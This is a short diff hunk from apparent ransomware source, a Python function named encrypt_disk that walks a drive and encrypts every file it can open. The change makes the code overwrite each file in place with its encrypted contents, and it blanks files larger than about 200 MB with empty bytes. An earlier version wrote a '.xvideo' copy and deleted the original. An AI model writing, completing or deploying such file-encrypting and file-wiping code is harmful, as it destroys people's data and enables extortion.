@@ -54,18 +54,23 @@ def encrypt_disk(DriveLetter):
 	        		encrypted_data = cipher_suite.encrypt(data) 
 	        
 	        		# Write the file encrypted is other file
-	        		with open(file_path + f".xvideo", "wb") as f:
+	        		with open(file_path, "wb") as f:
 	        			"""
 							check first the size of the file, if sizeof <= 100 Mo, you should continue
 							Then remove the original file
 	        			""" 
 	        			if data.__sizeof__() > 204000000:
+	        				# f.write(b'')
 	        				f.write(b'')
-	        				os.remove(file_path)
+	        				# os.remove(file_path)
 	        				# continue
 	        			else:
 		        			f.write(encrypted_data)
-		        			os.remove(file_path)
+		        			# os.remove(file_path)
+        				
+        				# with open(file_path +f".xvideo", "wb") as file:
+
+
 
         	except PermissionError:
 	        		continue
